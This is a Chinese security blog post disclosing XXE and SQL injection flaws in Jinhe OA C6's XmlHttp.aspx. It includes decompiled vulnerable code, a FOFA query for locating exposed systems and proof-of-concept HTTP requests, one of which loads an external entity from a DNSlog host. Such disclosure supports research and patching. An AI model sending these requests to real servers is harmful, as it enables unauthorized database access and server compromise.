---
title: "金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html
asset_dir: assets/金和oa-jhsoft.web.addmenulogintemplatexmlhttp.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/10 08:23
* 631浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

安全运维咨询

软件

Web安全书籍


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `XmlHttp.aspx`接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞和[XXE](https://mrxn.net/tag/XXE)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

编码转换工具

漏洞扫描器

数据库

直接根据 XmlHttp.aspx 在 bin 目录下查找 `Jhsoft.Web.AddMenu.dll` 将其进行反编译后找到 `XmlHttp` 的处理逻辑

```
namespace JHSoft.Web.AddMenu.LoginTemplate;

public class XmlHttp : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xml = new XmlDocument();
    xml.Load(this.Request.InputStream);
    XmlNode xmlNode = xml.SelectSingleNode("//root//flag");
    string innerText;
    if (xmlNode == null || (innerText = xmlNode.InnerText) == null)
      return;
    if (!string.op_Equality(innerText, "GetTemplateById"))
    {
      if (!string.op_Equality(innerText, "ActiveCustomCheck"))
        return;
      this.ActiveCustomCheck();
    }
    else
      this.GetTemplateById(xml);
  }
```

深入探索

技术文章订阅

网络安全培训

服务器安全服务

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE](https://mrxn.net/tag/XXE)漏洞，

同时 XML 内容会被带入 `GetTemplateById` 方法中，跟进

SQL注入防护

```
protected void GetTemplateById(XmlDocument xml)
{
  string str1 = string.Empty;
  XmlNode xmlNode = xml.SelectSingleNode("//root//id");
  if (xmlNode != null)
  {
    string innerText = xmlNode.InnerText;
    DataTable templateById = JHSoft.AddMenu.LoginTemplate.LoginTemplate.GetTemplateById(innerText);
    ......
public static DataTable GetTemplateById(string id)
{
  string str = $"select * from LoginTemplate\r\n                where id={id}";
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  DataTable templateById = dbOperator.ExecSQLReDataTable(str);
  if (dbOperator.IsError)
    templateById = (DataTable) null;
  return templateById;
}
```

`id` 的值被直接拼接进SQL语句中执行，无任何过滤和校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

代码安全审计

[![金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-001-bb0e64f86af2.webp)](https://image.mrxn.net/815c1adac48b4ce8b6931b3da0ad13cd.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="utf-8"?>
<root>
  <flag>GetTemplateById</flag>
  <id>SQLI_POC</id>
</root>
```

[![金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-002-707f50f6017d.webp)](https://image.mrxn.net/0c91dfd0e8da4ca390a997836c1b1f4f.webp)

成功延时 5 秒

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL注入](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx XXE漏洞+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALUElEQVR4Aeyci3LcthJE9+T//1k3o76HSwyBJe3E2q0KVYGb/ZghhCGth6vy1+Px+Pqd9dU+Vj1abLuXunVyUV1UF9VnuMqor9Be3V/p5rov/x2sgfxdd//3KSewDeTvaT+urL5x4AFstfr2ksM81325aB9Ivbqov0dIVs0sRIdg11fcPpA6GNG6jtad4b5uG8hevK/fdwKHgcA4fQhfbdHpw5iDcAhaD+EQVLfPVW4O0geeaC+IZlZdhPhycx1hzJ3lV/WQPhDsueKHgZR4r/edwB8bSH+KOj/7lCFPEQTP8uV7D0iNvLz9gvh77dW1fWBep/+qx1Xvjw3k6gbu3HgC/9pAfEpEyNPUubdXl4sw1pmD6BA0v0cYPRi5WXuK6uJK1xev5sxfwX9tIFdudmfOT+AwEKfecdUKJk/hLgxzH6J7H5hziL5r+X1p3Qy/A3//0T2Y9/o7+v2feRhzEL7yv4tf/GFdx1nJYSCz0K393AlsA4E8BfAaz7YGqfdpML/iMOZh5Kt6dUgeUDogMPw2AcINwsjVryLM6yE6vMb9fbaB7MX7+n0n8JdP7q9i3zLkKei6HOJ7H3URrvnmRfsVqonwaz1hnq/eteC1730r+7vrfkM8xQ/B04FAngqYo0/Cr34+kH69HqJDUF/0PhAfjmim13S9+52bh9yjc4gOwZWv3hHGuvJPB1Khe/3cCRwGApkaBPtTIxchObesLhe7fpVD+kPQfqJ9ZgjzGhh1a2HUYeTmvLeoDvM8jHqvkxceBlLivd53An9BpgdBp923pA7Jdf+Mw1gH4RBc1Xvfr6+v73+V7DlIPdCt73zVawDfP4/IRYhe2VrqYmm1ILmuyzvCmL/i329IP6U388sDgUy7npRaEO7+S6slP8PK7pd5NXnH7ssLYdxTr13xqq0FqYfgWV4f5vnqWcucCMmXV0u98PJAKnyvP38CpwOBcZow8ppwrdVWy9svc5A+ELyqm7MnpB7QOiDw8mtHL7B31+Uw76e/QhjrIByeeDqQVfNb/zMncPhdFmRaPiWit5dDchDUh3B4jfbpdeqifuddL1+tY3m1Vjpkr5WpZa6ua6141ytbS10srZZcLK2v+w3xdD4Elz+HQJ4amKP7d8LyMzQP6Wu+6xAfRjQP0eWFvUdp+6Uv6nUOY28YuXUw6jDnMOreD0a9+t5vSJ3CB63D1xD35hRXaE6EcdrW6a/wam5VD7kvPPFq9js3+WO1J8g9JiWDZL2o2bn6Hu83ZH8aH3C9DQTm04dRh5H7Oaymry5C6uXWQ3R599VhzKkXWiNCshBUr+yrBclDsGfP+sC8rveRQ/LAYxvI4/74iBPYvstaTV0dMkV53z3EV4dwGLHXQ3zrRBj1XmfuFV6tgdwLgquevd8Zt0/PQe6jvsf7DfHUPgS377IgU4M5OkWIL/fz6HylQ+r1Res76kPqur/nkEyv6dwa9c7PdH0RxvvaD6LDiNbN8H5DZqfyRm0biFPt2Pemrw7j9PVFiC8Xre8Iyav3PMSHI5qFePJVL3VIXt7r1CE5GLH78o69L4x9gPu7rMeHfWxvCGRa7g/CnSqEQ9CcaE4Oya10GH2Yc/v1PvI9nmX1Rcg95faSw9zvOfPqwPe/v8j1Yeynbq5wG4jmje89ge3nELcBmWJNq5Z6Xe8XzHMw6hBuH9FeMPfN/QrCvBeMOoS7B+8B0eUdIT4E9e0Dow4j73nr1AvvN6RO4YPW9nOIe+pTg0wZRjQPc11/hZC61f16HSSvDuHwxO7JvQckq36G1pnrXB2u9bUe1vn7DfFUPwS3ryFOz33BOEX9juZFffmvYq+H7KPr8hn2e0J6rHR76EPyEFQ/Q/t0XNXBsf/9hqxO6036YSCQqTnlvi+I33XzMPrq5uUijHlz4lkOUg9YsiEw/XnAngYhOfkKITnrxZ6H5M506yF54P5J/fFhH4c35MP295/bzjYQyGuzf42Aw4HoH4z/C/rA918XMOL/Y5sn79j7dF9urlBthZWpBdlTXdfq+dJmyxykHoLqorXyFcKxfhvIqujWf/YEtoE4VThOrbYE0WHE8mpB9LquZT+xtFqQnLpY3qvVc5A+cET7rGq63rn1MPbuuc5hzEO4/Xq+6+VvA9G88b0ncBhITamW26rrWp2XVkt9hZCnpLL71fN6XZfDvI91e+w1chHSSy7aY8Uhdatc11d9XumHgRi+8T0ncPjlIrx+CiC+2109FZDcmW+fjpB6dftAdAjqF8Ko9Rp5Za8sGPtZA3Ndv98HxvzKB+4fDB8f9rH9chEyxdX03Lc+JK++Qpjn7GMdvM5B/FUdPP9nzj0jh/RY3RNG35xoH/kZmhch/WFE/cL7a8jZqf6wv30NqenUgkyv7wOiQ7D7ZxysO0vGr73UCjv+WV6tvQO5BwT1YORVV2vlq1emlnyFMPbvOYhfvWrp13UteeH9htQpfNBafg2BTLXvtSa6X5CcGoT3OjnEh6C6CNFhxO7LZ9j3IhchveVi7wVjDkZuvtdDchA0dwXvN+TKKf1g5jAQyFT71N0TxIdg161bofmOZ3n9V3V6kL1ZA+EQNNfRfNc7h7EPhEOw5+0L8Tvf5w8D2Zv39c+fwDYQpyb2raiL+p1DngIImjtDSB6Cq7z3g+TgidaY6VxdhNSag5Gb0+98pZsTIX3lq7rSt4EUudf7T+AwEMg0V1uDub+aPszzvX+vh9StdOv19wiphRGt6QjJdV0O8SGo3tE9nOmw7nMYSG928589ge0ndcjUVlOGuQ/RIbjaPsx9GHXvL0J8CPb+EB2eaK1ZOTwzgPb2vwI0pwF8/9t/1/U7QvIwx1V+r99vyP40PuB6G4hPAWS67k1dDqOv3hGS6/UrDsnDiPZd1akXmoX0WPHK1lr5kPrK1IKRWydCfHnV1FpxdRFSD9z/HvL4sI/td1nuqyZbSy6Wtl8rfZ+pa3Mdy6sFeTq63zmc56rfftlDTS52Hc7vYW0hJG8fEUYdwqumlrm6riUv3P7KKuNe7z+Bw3dZqy1BpgzBmmYtCF/VdR2Sh2D12C/zap2rQ+r1CyEaBM2WV0sO8UurpV7X/8bq/TqH3L/rde/7DalT+KB1GAhkehB0r05TVBdhzKt3vFoPYz8YuX0gOqz/TR2S6XuRw9yHue69RUgOgvYVIToEVzpwf5f1+LCPw3dZ7s/py0XIlCG4yvW8/HfR+0DuC8F9P4gGI+4z+2tIbq/Vtff6+vr6/im+tP2CeZ0ZiA9BddH+8j0e/sram/f1z5/A9l2WUxNXW9EXIU+B/KwOkjcH4daL+p13XX+PZkS9zle6uY6QvarDyO3X0XzHnit+vyH9lN7Mt68hkGnDNez7htSpw2teT8N+WSfqQfpAUF+E6IDSZQSmv82F6BB0LzaWi+oipE7eEdb+/Yb003oz3wbitM/w6n57H+vU5VdxVadeuOoFeSIh2HMw6tWrljkYfQiHoDmxamvJxdJqySH18MRtIIZufO8JHAYCz2nB8/pXtwmpvVoHyUOw18GoQzgc0dp6Gmer+3IR0lMuznqVpg+pgxG7Lxerh+swEEM3vucE/vFAnKy4+jT0Yf706IuQnLz3Vd+jGTU5pBeMqN+x13cf0ke958+4vgjpB9y/y3p82Mc/fkNWn4/T7/5Kh+dTAs/f3EL03mfGV71n2b1mHYz3Uhf3Na+uYezTszD69i/8YwPpm7j5tRM4DKSmNFtn7SBTh2DPQ3QIeo+eU4fkznxIDp5oDUSzZ8dVruuQPhDsvrz3l+t3hLFf+YeBlHiv953ANhDItOA1rra6ehog/Vb+1X5X6lcZyB5gxH5veO3bX7QeUidfYa8zB6kH7u+yHh/2sb0hH7av/+x2/gcAAP//8enqyAAAAAZJREFUAwAG44+5NgvV5wAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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